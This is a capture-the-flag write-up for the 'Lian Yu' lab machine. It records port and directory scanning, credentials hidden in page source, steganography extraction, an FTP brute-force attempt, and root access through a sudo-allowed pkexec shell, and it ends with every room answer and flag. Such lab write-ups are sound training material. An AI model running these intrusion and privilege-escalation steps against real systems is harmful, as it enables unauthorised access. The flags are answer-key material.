LIAN YU.




[### WRITEUP]
[>>> 1. ENUMERATION: PORTS/SERVICES]
[ACTION: nmap quick all ports scan]
nmap -sS -T4 -sV -p- 10.10.222.130
[OUTPUT]
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.2
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
80/tcp    open  http    Apache httpd
111/tcp   open  rpcbind 2-4 (RPC #100000)
32791/tcp open  status  1 (RPC #100024)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
[NOTE]
rpcbind (or portmapper): helps rpc clients locate the rpc services on server by mapping rpc program numbers to network port numbers.
status: rpc status service.




[>>> 2. RECON: http://10.10.222.130/]
No clues in clear text or source code.




[>>> 3. RECON: ftp]
[ACTION: attempt anon login]
ftp 10.10.222.130
anonymous
[OUPTUT]
530 Permission denied.
ftp: Login failed



 
[>>> 4. ENUMERATION: http://10.10.222.130/]
[ACTION: common directories scan]
gobuster dir -u http://10.10.222.130/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[NOTE]
No useful output.


[ACTION: longer directory scan]
gobuster dir -u http://10.10.222.130/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[OUTPUT]
/island               (Status: 301) [Size: 236] [--> http://10.10.222.130/island/]
[NOTE]
Exploring http://10.10.222.130/island/, I found a possible cred pair: Lian_Yu|go!go!go!
Actual password is: vigilante
I read the source code too fast:
<p> I wasn't Expecting You at this Moment. I will meet you there </p><!-- go!go!go! -->
<p>You should find a way to <b> Lian_Yu</b> as we are planed. The Code Word is: </p><h2 style="color:white"> vigilante</style></h2>




[>>> 5. ATTEMPT: ftp]
[NOTE]
New ip due to machine reboot: 10.10.42.49
[ACTION: attempt to login as Lian_Yu]
ftp 10.10.42.49
Lian_Yu
[OUTPUT]
530 Permission denied.
ftp: Login failed


[ACTION: attempt to login as vigilante]
ftp 10.10.42.49
vigilante
[OUTPUT]
331 Please specify the password.
[NOTE]
Looks like the actual user was vigilante. 
We can try to bruteforce.




[>>> 6. BRUTEFORCE: ftp]
[ACTION: bruteforce vigilante login]
hydra -l vigilante thm/rockyou.txt ftp://10.10.42.49
[NOTE]
Hydra is taking too long.
I'm missing some clue.



[>>> 7. ENUMERATION: http://10.10.42.49/island/]
[NOTE]
I ran gobuster with lists:
/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt 
with no recursiveness and got no directory apart from /island.
I'll use the -r flag (recursive scan) on island.
[ACTION: recursive island scan, common]
gobuster dir -u http://10.10.42.49/island/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -r
[NOTE]
No useful output.


[ACTION: recursive island scan, 2.3 big]
gobuster dir -u http://10.10.42.49/island/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -r 
[OUPTUT]
/2100                 (Status: 200) [Size: 292]




[>>> 8. RECON: http://10.10.42.49/island/2100/]
[ACTION: explore http://10.10.42.49/island/2100/]
Site displays text: "How Oliver Queen finds his way to Lian_Yu"
And an unavailable youtube video.


[ACTION: view source code]
ctrl + u
[OUTPUT]
<iframe width="640" height="480" src="https://www.youtube.com/embed/X8ZiFuW41yY">
</iframe> <p>
<!-- you can avail your .ticket here but how?   -->


[ACTION: use https://web.archive.org/]
Searching for the url: https://web.archive.org/web/20240315000000*/https://youtu.be/X8ZiFuW41yY
1 snapshot from 03/05/2024.
[NOTE]
Web archive returned 503.
For now, I'll investigate leaving the video aside.
We are told .ticket is here, which means we can run a file scan.


[ACTION: gobuster .ticket common scan]
gobuster dir -u http://10.10.42.49/island/2100/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x ticket
[NOTE]
No useful output.


[ACTION: gobuster .ticket medium file scan]
gobuster dir -u http://10.10.42.49/island/2100/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x ticket
[NOTE]
No useful output.
Also tried creating and running a filtererd large scan, to no success:
Wordlist setup:
grep -Ei 'ticket|auth|session|login|key|token|pass|cred|secure|id|user|admin|account|verify|access|check|validate|sign|cert|debug|staging|backup|old|dev'     /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt     | sort -u     > ticket_wordlist_large.txt
Execution:
gobuster dir -u http://10.10.42.49/island/2100/ -w ticket_wordlist_large.txt -x ticket


[ACTION: gobuster .ticket medium directory scan]
gobuster dir -u http://10.10.42.49/island/2100/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .ticket
[OUTPUT]
/green_arrow.ticket   (Status: 200) [Size: 71]


[ACTION: explore http://10.10.42.49/island/2100/green_arrow.ticket]
[OUTPUT]
This is just a token to get into Queen's Gambit(Ship)
RTy8yhBQdscX
[NOTE]
String didn't work as vigilante ftp password.
It also looks like it might be encoded. 


[ACTION: decode RTy8yhBQdscX via https://gchq.github.io/CyberChef/]
After trying some base decodes, found success with base58.
[OUTPUT]
!#th3h00d



[>>> 9. FTP]
[ACTION: ssh as vigilante]
ftp 10.10.42.49
vigilante
!#th3h00d
[OUTPUT]
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 


[ACTION: list content current directory]
dir
[OUTPUT]
-rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05  2020 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg


[ACTION: download all files current directory]
prompt off
mget *


[ACTION: display leave me]
xdg-open Leave_me_alone.png
[OUTPUT]
Fatal error reading PNG image file: Not a PNG file.


[ACTION: check leave me properties]
file Leave_me_alone.png
[OUTPUT]
Leave_me_alone.png: data
[NOTE]
Signature wasn't recognised.
Either corrupted or encrypted.
Tried:
1. Change extension to zip and unzip.
2. binwalk.


[ACTION: run exiftool on leave me]
exiftool Leave_me_alone.png
[OUTPUT]
ExifTool Version Number         : 13.25
File Name                       : Leave_me_alone.png
Directory                       : .
File Size                       : 512 kB
File Modification Date/Time     : 2020:05:01 05:26:06+02:00
File Access Date/Time           : 2025:08:12 21:02:10+02:00
File Inode Change Date/Time     : 2025:08:12 21:02:10+02:00
File Permissions                : -rw-r--r--
Error                           : File format error


[NOTE]
Normal png header: 89 50 4E 47 0D 0A 1A 0A
[ACTION: check leave me magic bites]
xxd -l 16 Leave_me_alone.png
[OUTPUT]
00000000: 5845 6fae 0a0d 1a0a 0000 000d 4948 4452  XEo.........IHDR


[ACTION: display Queen's]
xdg-open Queen\'s_Gambit.png
[OUTPUT]
A boat.


[ACTION: display aa]
xdg-open aa.jpg
[OUTPUT]
A guy in survival gear.


[NOTE]
File 1: corrupted.
File 2, 3: seemingly no cleartext clues.
I'll test steganography tools.
[ACTION: binwalk on Queen's]
binwalk Queen\'s_Gambit.png
[OUTPUT]
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             PNG image, 1280 x 720, 8-bit/color RGBA, non-interlaced


[NOTE]
.png  extension means steghide (bmp, wav, jpeg, au) won't work. We will use zsteg (.png, .bmp).
[ACTION: zsteg o n Queen's]
zsteg Queen\'s_Gambit.png
[OUTPUT]
"<x:xmpmeta xmlns:x=\"adobe:ns:meta/\" x:xmptk=\"XMP Core 5.4.0\">\n   <rdf:RDF xmlns:rdf=\"http://www.w3.org/1999/02/22-rdf-syntax-ns#\">\n      <rdf:Description rdf:about=\"\"\n            xmlns:tiff=\"http://ns.adobe.com/tiff/1.0/\">\n         <tiff:Orientation>1</tiff:Orientation>\n      </rdf:Description>\n   </rdf:RDF>\n</x:xmpmeta>\n"
imagedata           .. file: little endian ispell 3.0 hash file, and 255 string characters
b1,rgba,lsb,xy      .. text: ["U" repeated 10 times]
b1,abgr,msb,xy      .. text: ["U" repeated 10 times]
b2,r,lsb,xy         .. file: SoftQuad DESC or font file binary - version 21845
b2,r,msb,xy         .. file: VISX image file
b2,b,lsb,xy         .. file: VISX image file (zero)
b2,b,msb,xy         .. text: ["U" repeated 8 times]
b2,rgba,lsb,xy      .. text: ["c" repeated 8 times]
b2,abgr,msb,xy      .. text: ["{" repeated 8 times]
b3,rgba,lsb,xy      .. text: "ywsw7sw7sw7sw7sw7sw7sw7sw7st"
b4,r,lsb,xy         .. text: "wwwwffffUUUUUVgwwwwwwwwwwwww"
b4,r,msb,xy         .. text: "UUUUUUUU3333"
b4,g,lsb,xy         .. text: "wwwwfffffgx"
b4,g,msb,xy         .. text: ["3" repeated 8 times]
b4,b,lsb,xy         .. file: OpenPGP Public Key
b4,b,msb,xy         .. file: OpenPGP Public Key
b4,bgr,lsb,xy       .. file: OpenPGP Secret Key
b4,abgr,msb,xy      .. text: "?]?]?]?]"


[ACTION: grab opepgp key and verify integrity]
zsteg -E b4,b,lsb,xy -B "Queen's_Gambit.png" > publickey.bin
gpg --list-packets publickey.asc
[OUTPUT]
...
gpg: [don't know]: invalid packet (ctb=67)
gpg: [don't know]: invalid packet (ctb=77)
gpg: packet(6) with unknown version 170
# off=0 ctb=99 tag=6 hlen=3 plen=39321
:key packet: [unknown version]
# off=39344 ctb=9a tag=6 hlen=5 plen=2863311530
:key packet: [unknown version]
[NOTE]
Also, aa doesn't appear to be hiding anything.
It looks like we have to fix leave me magic bits.


[ACTION: fix leave me magic bits]
python3 -c "data=open('Leave_me_alone.png','rb').read(); open('Leave_me_alone_fixed.png','wb').write(b'\x89PNG\r\n\x1a\n'+data[8:])"


[ACTION: display fixed copy]
xdg-open Leave_me_alone_fixed.png
[OUTPUT]
"Just leave me a lone
Here take it what you want
password"
[NOTE]
This probably means another file is hiding content, password-protected.
Leave me is .png (zsteg doesn't support password encryption).
It is probably aa.


[ACTION: grab aa hidden files]
steghide extract -sf aa.jpg
password
[OUTPUT]
wrote extracted data to "ss.zip".


[ACTION: extract ss]
unzip ss.zip
  inflating: passwd.txt            
  inflating: shado


[ACTION: display passwd]
cat passwd.txt
[OUTPUT]
This is your visa to Land on Lian_Yu # Just for Fun ***


a small Note about it


Having spent years on the island, Oliver learned how to be resourceful and 
set booby traps all over the island in the common event he ran into dangerous
people. The island is also home to many animals, including pheasants,
wild pigs and wolves.


[ACTION: check shado file type]
file shado
[OUTPUT]
shado: Clarion Developer (v2 and above) memo data
[NOTE]
Format is propietary, which makes it harder to read.


[ACTION: run strings on shado]
strings shado
[OUTPUT]
M3tahuman
[NOTE]
We got a new string.
Users: Oliver (unused), vigilante (ftp).
Passwords: !#th3h00d (vigilante's ftp), password (steghide), M3tahuman.
Looks like a likely ssh cred pair is Oliver|M3tahuman, however, it fails.
M3tahuman is a password, so we are probably missing a user.


[ACTION: research ftp]
ftp 10.10.42.49
pwd
[OUTPUT]
/home/vigilante


[ACTION: move into home and list]
cd ..
dir
[OUTPUT]
drwx------    2 1000     1000         4096 May 01  2020 slade
drwxr-xr-x    2 1001     1001         4096 May 05  2020 vigilante
[NOTE]
If we had run pwd at the start of our ftp session, we would have found slade sooner.




[>>> 10. PRIVESC: to user (slade)]
[ACTION: ssh as slade]
ssh slade@10.10.42.49
M3tahuman
[OUTPUT]
slade@LianYu:~$ 


[ACTION: find user flag]
find / -name "user.txt" 2>/dev/null
[OUTPUT]
/home/slade/user.txt


[ACTION: display user flag]
cat user.txt
[OUTPUT]
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
			--Felicity Smoak


[ACTION: display suid binaries]
find / -perm -4000 -type f 2>/dev/null
[OUTPUT]
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/pt_chown
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/pkexec
/usr/bin/at
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/procmail
/usr/bin/newgrp
/usr/bin/sudo
/usr/sbin/exim4
/bin/su
/bin/mount
/bin/umount
/sbin/mount.nfs


[ACTION: exploit su]
sudo su
[OUTPUT]
Sorry, user slade is not allowed to execute '/bin/su' as root on LianYu.


[ACTION: exploit at]
echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | sudo at now; tail -f /dev/null
[OUTPUT]
Sorry, user slade is not allowed to execute '/usr/bin/at now' as root on LianYu.


[ACTION: check sudo permissions]
sudo -l
[OUTPUT]
Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec




[>>> 11. PRIVESC: to root]
[ACTION: exploit pkexec]
sudo pkexec /bin/sh
[OUTPUT]
#


[ACTION: display root flag]
cat /root/root.txt
[OUTPUT]
                          Mission accomplished



You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 



THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
									      --DEATHSTROKE

Let me know your comments about this machine :)
I will be available @twitter @User6825




[### QUESTIONS]
[>>> TASK 1: FIND THE FLAGS]
[1.1. DEPLOY THE VM AND START THE ENUMERATION]
Nothing to answer here.



[1.2. WHAT IS THE WEB DIRECTORY YOU FOUND?]
[ANSWER]
2100



[1.3. WHAT IS THE FILE NAME YOU FOUND?]
[ANSWER]
green_arrow.ticket



[1.4. WHAT IS THE FTP PASSWORD?]
[ANSWER]
!#th3h00d


[1.5. WHAT IS THE FILE NAME WITH SSH PASSWORD?]
[ANSWER]
shado



[1.6. user.txt]
[ANSWER]
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}



[1.7. root.txt]
[ANSWER]
THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}

